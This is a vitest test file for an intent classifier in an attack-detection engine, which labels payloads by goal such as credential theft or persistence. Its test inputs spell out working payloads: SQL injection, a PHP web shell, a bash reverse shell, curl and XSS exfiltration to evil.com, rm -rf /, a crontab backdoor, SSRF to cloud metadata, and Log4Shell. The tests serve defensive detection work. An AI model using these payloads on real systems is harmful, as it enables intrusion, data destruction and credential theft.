import { describe, it, expect } from 'vitest'
import { classifyIntent, intentSeverity } from './intent-classifier.js'
import { InvariantEngine } from '../invariant-engine.js'

describe('Intent Classifier', () => {

    describe('SQL injection intents', () => {
        it('classifies credential extraction from users table', () => {
            const result = classifyIntent(
                ['sql_string_termination', 'sql_union_extraction'],
                "' UNION SELECT username,password FROM users--",
            )
            expect(result.primaryIntent).toBe('exfiltrate_credentials')
            expect(result.intents).toContain('exfiltrate_credentials')
            expect(result.targets.some(t => t.includes('users'))).toBe(true)
            expect(result.targets.some(t => t.includes('password'))).toBe(true)
            expect(result.severityMultiplier).toBe(1.00)
        })

        it('classifies DROP TABLE as destroy_data', () => {
            const result = classifyIntent(
                ['sql_stacked_execution'],
                "'; DROP TABLE users--",
            )
            expect(result.intents).toContain('destroy_data')
            expect(result.severityMultiplier).toBeGreaterThanOrEqual(0.95)
        })

        it('classifies SLEEP as denial_of_service', () => {
            const result = classifyIntent(
                ['sql_time_oracle'],
                "' OR SLEEP(10)--",
            )
            expect(result.intents).toContain('denial_of_service')
        })

        it('classifies information_schema as enumerate', () => {
            const result = classifyIntent(
                ['sql_union_extraction'],
                "' UNION SELECT table_name,column_name FROM information_schema.columns--",
            )
            expect(result.intents).toContain('enumerate')
        })

        it('classifies @@version as reconnaissance', () => {
            const result = classifyIntent(
                ['sql_union_extraction'],
                "' UNION SELECT @@version--",
            )
            expect(result.intents).toContain('reconnaissance')
        })

        it('classifies INTO OUTFILE as establish_persistence', () => {
            const result = classifyIntent(
                ['sql_stacked_execution'],
                "'; SELECT '<?php system($_GET[cmd])?>' INTO OUTFILE '/var/www/shell.php'--",
            )
            expect(result.intents).toContain('establish_persistence')
        })

        it('classifies general UNION SELECT as exfiltrate_data', () => {
            const result = classifyIntent(
                ['sql_union_extraction'],
                "' UNION SELECT id,name,email FROM orders--",
            )
            expect(result.intents).toContain('exfiltrate_data')
        })
    })

    describe('Command injection intents', () => {
        it('classifies reverse shell as code_execution + persistence', () => {
            const result = classifyIntent(
                ['cmd_separator'],
                "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            )
            expect(result.intents).toContain('code_execution')
            expect(result.intents).toContain('establish_persistence')
            expect(result.detail).toContain('Reverse shell')
        })

        it('classifies credential file access', () => {
            const result = classifyIntent(
                ['cmd_separator'],
                "; cat /etc/shadow",
            )
            expect(result.intents).toContain('exfiltrate_credentials')
            expect(result.targets.some(t => t.includes('/etc/shadow'))).toBe(true)
        })

        it('classifies rm -rf as destroy_data', () => {
            const result = classifyIntent(
                ['cmd_separator'],
                "; rm -rf /",
            )
            expect(result.intents).toContain('destroy_data')
        })

        it('classifies crontab as persistence', () => {
            const result = classifyIntent(
                ['cmd_separator'],
                '; echo "* * * * * /tmp/backdoor" | crontab -',
            )
            expect(result.intents).toContain('establish_persistence')
        })

        it('classifies curl exfiltration', () => {
            const result = classifyIntent(
                ['cmd_substitution'],
                '$(cat /etc/passwd | base64 | curl -d @- https://evil.com/collect)',
            )
            expect(result.intents).toContain('exfiltrate_data')
        })

        it('classifies sudo as privilege escalation', () => {
            const result = classifyIntent(
                ['cmd_separator'],
                '; sudo chmod +s /bin/bash',
            )
            expect(result.intents).toContain('escalate_privilege')
        })
    })

    describe('XSS intents', () => {
        it('classifies document.cookie theft', () => {
            const result = classifyIntent(
                ['xss_tag_injection', 'xss_event_handler'],
                '<img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)">',
            )
            expect(result.intents).toContain('exfiltrate_credentials')
            expect(result.targets).toContain('session:cookie')
        })

        it('classifies keylogger', () => {
            const result = classifyIntent(
                ['xss_event_handler'],
                '<script>document.addEventListener("keypress",function(e){fetch("/log?k="+e.key)})</script>',
            )
            expect(result.intents).toContain('exfiltrate_credentials')
        })

        it('classifies location redirect as data theft', () => {
            const result = classifyIntent(
                ['xss_tag_injection'],
                '<script>location.href="https://evil.com/phish"</script>',
            )
            expect(result.intents).toContain('exfiltrate_data')
        })

        it('classifies generic XSS as code_execution', () => {
            const result = classifyIntent(
                ['xss_tag_injection'],
                '<script>alert(1)</script>',
            )
            expect(result.intents).toContain('code_execution')
        })
    })

    describe('Path traversal intents', () => {
        it('classifies /etc/passwd as credential extraction', () => {
            const result = classifyIntent(
                ['path_dotdot_escape'],
                '../../etc/passwd',
            )
            expect(result.intents).toContain('exfiltrate_credentials')
            expect(result.targets.some(t => t.includes('/etc/passwd'))).toBe(true)
        })

        it('classifies .env as credential extraction', () => {
            const result = classifyIntent(
                ['path_dotdot_escape'],
                '../../../.env',
            )
            expect(result.intents).toContain('exfiltrate_credentials')
        })

        it('classifies generic path traversal as reconnaissance', () => {
            const result = classifyIntent(
                ['path_dotdot_escape'],
                '../../var/log/syslog',
            )
            expect(result.intents).toContain('reconnaissance')
        })
    })

    describe('SSRF intents', () => {
        it('classifies cloud metadata as credential extraction', () => {
            const result = classifyIntent(
                ['ssrf_cloud_metadata'],
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            )
            expect(result.primaryIntent).toBe('exfiltrate_credentials')
            expect(result.targets).toContain('service:cloud_metadata')
        })

        it('classifies general SSRF as reconnaissance', () => {
            const result = classifyIntent(
                ['ssrf_internal_reach'],
                'http://192.168.1.1:8080/admin',
            )
            expect(result.intents).toContain('reconnaissance')
        })
    })

    describe('Other attack intents', () => {
        it('classifies deserialization as code_execution', () => {
            const result = classifyIntent(
                ['deser_java_gadget'],
                'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',
            )
            expect(result.intents).toContain('code_execution')
        })

        it('classifies Log4Shell as code_execution + persistence', () => {
            const result = classifyIntent(
                ['log_jndi_lookup'],
                '${jndi:ldap://evil.com/exploit}',
            )
            expect(result.intents).toContain('code_execution')
            expect(result.intents).toContain('establish_persistence')
        })

        it('classifies auth bypass as privilege escalation', () => {
            const result = classifyIntent(
                ['auth_none_algorithm', 'jwt_confusion'],
                '{"alg":"none","typ":"JWT"}',
            )
            expect(result.intents).toContain('escalate_privilege')
        })

        it('classifies GraphQL deep nesting as DoS', () => {
            const result = classifyIntent(
                ['graphql_deep_nesting'],
                '{ a { b { c { d { e { f { g { h } } } } } } } }',
            )
            expect(result.intents).toContain('denial_of_service')
        })

        it('classifies env_exfiltration as credential theft', () => {
            const result = classifyIntent(
                ['env_exfiltration'],
                'process.env.DATABASE_URL',
            )
            expect(result.intents).toContain('exfiltrate_credentials')
        })

        it('classifies proto_pollution as privilege escalation', () => {
            const result = classifyIntent(
                ['proto_pollution'],
                '{"__proto__":{"isAdmin":true}}',
            )
            expect(result.intents).toContain('escalate_privilege')
        })
    })

    describe('Multi-intent attacks', () => {
        it('SQL + CMD polyglot has multiple intents', () => {
            const result = classifyIntent(
                ['sql_stacked_execution', 'cmd_separator'],
                "'; exec xp_cmdshell 'cat /etc/passwd'--",
            )
            expect(result.intents.length).toBeGreaterThanOrEqual(2)
            // Should detect both credential extraction (passwd) and code execution
            expect(result.intents).toContain('exfiltrate_credentials')
            expect(result.intents).toContain('code_execution')
        })

        it('primary intent is highest severity', () => {
            const result = classifyIntent(
                ['sql_union_extraction', 'sql_time_oracle'],
                "' UNION SELECT password FROM users WHERE 1=1 AND SLEEP(5)--",
            )
            // exfiltrate_credentials (1.00) > denial_of_service (0.75)
            expect(result.primaryIntent).toBe('exfiltrate_credentials')
        })
    })

    describe('intentSeverity', () => {
        it('exfiltrate_credentials is highest', () => {
            expect(intentSeverity('exfiltrate_credentials')).toBe(1.00)
        })

        it('reconnaissance is lowest non-unknown', () => {
            expect(intentSeverity('reconnaissance')).toBe(0.45)
        })

        it('unknown returns 0.30', () => {
            expect(intentSeverity('unknown')).toBe(0.30)
        })
    })

    describe('Confidence scoring', () => {
        it('specific targets boost confidence', () => {
            const withTargets = classifyIntent(
                ['sql_union_extraction'],
                "' UNION SELECT password FROM users--",
            )
            const noTargets = classifyIntent(
                ['sql_union_extraction'],
                "' UNION SELECT 1,2,3--",
            )
            expect(withTargets.confidence).toBeGreaterThan(noTargets.confidence)
        })

        it('unknown intent has low confidence', () => {
            const result = classifyIntent(
                ['crlf_header_injection'],
                'X-Custom: value\r\nX-Injected: true',
            )
            // CRLF is not specifically mapped to a high-severity intent
            expect(result.confidence).toBeLessThanOrEqual(0.40)
        })
    })

    describe('Integration with InvariantEngine', () => {
        const engine = new InvariantEngine()

        it('classifies real SQL injection payload intent', () => {
            const deep = engine.detectDeep("' UNION SELECT username,password FROM accounts--", [])
            const classes = deep.matches.map(m => m.class)
            const intent = classifyIntent(classes, "' UNION SELECT username,password FROM accounts--")

            expect(intent.primaryIntent).toBe('exfiltrate_credentials')
            expect(intent.severityMultiplier).toBe(1.00)
        })

        it('classifies real XSS cookie theft intent', () => {
            const payload = '<script>new Image().src="https://evil.com/?c="+document.cookie</script>'
            const deep = engine.detectDeep(payload, [])
            const classes = deep.matches.map(m => m.class)
            const intent = classifyIntent(classes, payload)

            if (classes.some(c => c.startsWith('xss_'))) {
                expect(intent.intents).toContain('exfiltrate_credentials')
            }
        })

        it('classifies real path traversal intent', () => {
            const deep = engine.detectDeep('../../.ssh/id_rsa', [])
            const classes = deep.matches.map(m => m.class)
            const intent = classifyIntent(classes, '../../.ssh/id_rsa')

            if (classes.some(c => c.startsWith('path_'))) {
                expect(intent.intents).toContain('exfiltrate_credentials')
                expect(intent.targets.some(t => t.includes('.ssh/'))).toBe(true)
            }
        })
    })
})
